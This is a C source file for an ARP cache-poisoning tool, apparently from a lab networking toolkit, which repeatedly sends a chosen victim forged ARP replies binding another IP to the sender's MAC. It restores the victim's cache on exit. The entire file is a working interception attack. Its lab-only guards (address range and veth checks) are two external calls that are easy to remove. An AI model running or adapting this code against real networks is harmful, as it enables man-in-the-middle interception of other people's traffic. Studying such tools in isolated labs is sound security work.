/* arpspoof: lab-only ARP cache poisoning of ONE victim for ONE IP.
 *
 * It first resolves the true MAC of the spoofed IP, then repeatedly sends the
 * victim an unsolicited reply binding that IP to our MAC. On SIGINT/SIGTERM (and
 * after -n sends) it sends corrective replies carrying the true MAC, so the
 * victim's cache is restored. Guarded by NT_LAB, the 10.0.0.0/16 range and a
 * veth driver check; it never touches the host.
 */
#include "clock.h"
#include "guard.h"
#include "nettk.h"
#include "opts.h"

#include <arpa/inet.h>
#include <errno.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <netpacket/packet.h>

#define NT_ARP_RECV_CAP 2048
#define NT_ETH_MIN 60
#define NT_BCAST { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }

static const uint8_t bcast[6] = NT_BCAST;
static volatile sig_atomic_t g_stop;

static void on_signal(int s) { (void)s; g_stop = 1; }

static uint32_t v4(const uint8_t p[4])
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3];
}

static void put_v4(uint8_t out[4], uint32_t ip)
{
    out[0] = (uint8_t)(ip >> 24); out[1] = (uint8_t)(ip >> 16);
    out[2] = (uint8_t)(ip >> 8);  out[3] = (uint8_t)ip;
}

static void fmt_mac(char out[18], const uint8_t m[6])
{
    snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0], m[1], m[2], m[3], m[4], m[5]);
}

static int iface_mac_ip(const char *iface, uint8_t mac[6], uint32_t *ip)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) { close(fd); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) { close(fd); return -1; }
    *ip = ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr);
    close(fd);
    return 0;
}

static int send_frame(int fd, int ifindex, const uint8_t *frame, size_t len,
                      const uint8_t dst[6])
{
    uint8_t padded[NT_ETH_MIN];
    const uint8_t *wire = frame;
    size_t wire_len = len;
    if (len < NT_ETH_MIN) {
        memcpy(padded, frame, len);
        memset(padded + len, 0, NT_ETH_MIN - len);
        wire = padded;
        wire_len = NT_ETH_MIN;
    }
    struct sockaddr_ll to;
    memset(&to, 0, sizeof to);
    to.sll_family = AF_PACKET;
    to.sll_protocol = htons(ETH_P_ARP);
    to.sll_ifindex = ifindex;
    to.sll_halen = 6;
    memcpy(to.sll_addr, dst, 6);
    return sendto(fd, wire, wire_len, 0, (struct sockaddr *)&to, sizeof to);
}

/* resolve target -> MAC with up to `tries` requests. */
static int resolve(int fd, int ifindex, const uint8_t our_mac[6], uint32_t our_ip,
                   uint32_t target, uint8_t out[6], long tries, long timeout_ms)
{
    nt_arp_in req;
    memset(&req, 0, sizeof req);
    memcpy(req.eth_src, our_mac, 6);
    memcpy(req.eth_dst, bcast, 6);
    req.op = 1;
    memcpy(req.sha, our_mac, 6);
    put_v4(req.spa, our_ip);
    put_v4(req.tpa, target);
    uint8_t frame[NT_ETH_MIN];
    size_t flen = 0;
    if (nt_build_arp_frame(frame, sizeof frame, &flen, &req) != NT_OK)
        return -1;

    for (long t = 0; t < tries; t++) {
        send_frame(fd, ifindex, frame, flen, bcast);
        uint64_t deadline = nt_now_ns() + nt_ms_to_ns((uint64_t)timeout_ms);
        while (nt_poll_until(fd, POLLIN, deadline) > 0) {
            uint8_t buf[NT_ARP_RECV_CAP];
            struct sockaddr_ll from;
            socklen_t flen2 = sizeof from;
            ssize_t n = recvfrom(fd, buf, sizeof buf, 0, (struct sockaddr *)&from, &flen2);
            if (n < 0)
                break;
            if (from.sll_pkttype == PACKET_OUTGOING)
                continue;
            nt_eth_hdr eth;
            nt_vlan vlan;
            if (nt_eth_decode(buf, (size_t)n, &eth, &vlan) != NT_OK || eth.ethertype != 0x0806)
                continue;
            nt_arp a;
            if (nt_arp_decode(buf + 14, (size_t)n - 14, &a) != NT_OK || a.op != 2)
                continue;
            if (v4(a.spa) != target || memcmp(a.sha, eth.src, 6) != 0)
                continue;
            memcpy(out, a.sha, 6);
            return 0;
        }
        timeout_ms *= 2;
    }
    return -1;
}

static int send_binding(int fd, int ifindex, const uint8_t eth_src[6],
                        const uint8_t target_mac[6], uint32_t spoof_ip, uint32_t victim_ip)
{
    nt_arp_in in;
    memset(&in, 0, sizeof in);
    memcpy(in.eth_src, eth_src, 6);
    memcpy(in.eth_dst, target_mac, 6);
    in.op = 2;
    memcpy(in.sha, eth_src, 6);
    put_v4(in.spa, spoof_ip);
    memcpy(in.tha, target_mac, 6);
    put_v4(in.tpa, victim_ip);
    uint8_t frame[NT_ETH_MIN];
    size_t flen = 0;
    if (nt_build_arp_frame(frame, sizeof frame, &flen, &in) != NT_OK)
        return -1;
    return send_frame(fd, ifindex, frame, flen, target_mac);
}

int main(int argc, char **argv)
{
    const char *iface = NULL, *victim_s = NULL, *spoof_s = NULL;
    long count = 0, period_ms = 1000;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        const char *v;
        if ((v = nt_opt_value(a, 'i', &i, argc, argv)) != NULL) iface = v;
        else if ((v = nt_opt_value(a, 't', &i, argc, argv)) != NULL) victim_s = v;
        else if ((v = nt_opt_value(a, 's', &i, argc, argv)) != NULL) spoof_s = v;
        else if ((v = nt_opt_value(a, 'n', &i, argc, argv)) != NULL) count = strtol(v, NULL, 10);
        else if ((v = nt_opt_value(a, 'p', &i, argc, argv)) != NULL) period_ms = strtol(v, NULL, 10);
        else {
            fprintf(stderr,
                    "usage: arpspoof -i <iface> -t <victim-ip> -s <spoof-ip> "
                    "[-n count] [-p period_ms]\n");
            return 2;
        }
    }
    if (iface == NULL || victim_s == NULL || spoof_s == NULL || period_ms <= 0) {
        fprintf(stderr, "usage: arpspoof -i <iface> -t <victim-ip> -s <spoof-ip> "
                        "[-n count] [-p period_ms]\n");
        return 2;
    }
    struct in_addr v, s;
    if (inet_aton(victim_s, &v) == 0 || inet_aton(spoof_s, &s) == 0) {
        fprintf(stderr, "arpspoof: bad IPv4 address\n");
        return 2;
    }
    uint32_t victim = ntohl(v.s_addr), spoof = ntohl(s.s_addr);
    if (nt_guard_ipv4(victim) != 0 || nt_guard_ipv4(spoof) != 0)
        return 1;
    if (nt_guard_iface_veth(iface) != 0)
        return 1;

    uint8_t our_mac[6];
    uint32_t our_ip = 0;
    if (iface_mac_ip(iface, our_mac, &our_ip) != 0) {
        fprintf(stderr, "arpspoof: %s: cannot read MAC/address: %s\n", iface, strerror(errno));
        return 1;
    }

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (fd < 0) {
        fprintf(stderr, "arpspoof: socket: %s (need root/CAP_NET_RAW)\n", strerror(errno));
        return 1;
    }
    struct sockaddr_ll ll;
    memset(&ll, 0, sizeof ll);
    ll.sll_family = AF_PACKET;
    ll.sll_protocol = htons(ETH_P_ARP);
    ll.sll_ifindex = (int)if_nametoindex(iface);
    if (ll.sll_ifindex == 0 || bind(fd, (struct sockaddr *)&ll, sizeof ll) != 0) {
        fprintf(stderr, "arpspoof: bind %s: %s\n", iface, strerror(errno));
        close(fd);
        return 1;
    }
    int ifindex = ll.sll_ifindex;

    uint8_t victim_mac[6], spoof_real[6];
    if (resolve(fd, ifindex, our_mac, our_ip, victim, victim_mac, 3, 500) != 0) {
        fprintf(stderr, "arpspoof: cannot resolve victim %s\n", victim_s);
        close(fd);
        return 1;
    }
    if (resolve(fd, ifindex, our_mac, our_ip, spoof, spoof_real, 3, 500) != 0) {
        fprintf(stderr, "arpspoof: cannot resolve spoofed address %s\n", spoof_s);
        close(fd);
        return 1;
    }

    char vm[18], sm[18], wm[18];
    fmt_mac(vm, victim_mac);
    fmt_mac(sm, spoof_real);
    fmt_mac(wm, our_mac);
    printf("poisoning %s [%s]: %s is-at %s (real %s) every %ld ms\n",
           victim_s, vm, spoof_s, wm, sm, period_ms);

    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_signal;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    long sent = 0;
    while (!g_stop && (count == 0 || sent < count)) {
        if (send_binding(fd, ifindex, our_mac, victim_mac, spoof, victim) < 0)
            fprintf(stderr, "arpspoof: send: %s\n", strerror(errno));
        sent++;
        if (!g_stop && (count == 0 || sent < count))
            nt_poll_until(-1, 0, nt_now_ns() + nt_ms_to_ns((uint64_t)period_ms));
    }

    /* Restore: give the victim the real binding, repeated for reliability. */
    for (int i = 0; i < 3; i++)
        send_binding(fd, ifindex, spoof_real, victim_mac, spoof, victim);
    printf("sent %ld poison frame(s); restored %s -> %s\n", sent, spoof_s, sm);

    close(fd);
    return 0;
}
